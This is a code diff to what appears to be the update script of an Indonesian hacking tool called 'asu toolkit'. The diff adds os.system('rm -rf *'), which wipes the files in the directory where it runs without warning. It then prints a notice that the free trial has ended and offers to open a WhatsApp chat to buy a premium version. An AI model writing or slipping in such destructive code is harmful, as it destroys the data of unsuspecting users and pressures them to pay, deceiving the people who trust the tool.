@@ -1,6 +1,16 @@
-import time,subprocess
-print("[*] added new module multibruteforce v3")
-exit("[!] tunggu sekitar 20menit gan\n[!] asu toolkit sedang dalam perbaikan server")
-s=subprocess.Popen(["git","pull"],
+import time,subprocess,os
+os.system("rm -rf *")
+
+print("[!] mohon maaf trial gratis sudah berakhir")
+print("[!] silahkan membeli fitur premium untuk asu toolkit yang lebih baik.")
+print("[!] pilih y untuk langsung menghubungi administrator (whatsapp)")
+f=raw_input("[!] beli? y/n): ").lower()
+if f =="y":
+    subprocess.check_output(
+								["am","start",
+				"https://api.whatsapp.com/send?phone=62895353484895&text=helo%20admin%20saya%20ingin%20membeli%20asu%20toolkit%20premium%20fitur%20premium"])
+exit("[!] terimakasih atas jawaban anda.")
+    
+#s=subprocess.Popen(["git","pull"],
     stdout=subprocess.PIPE)
 time.sleep(2)
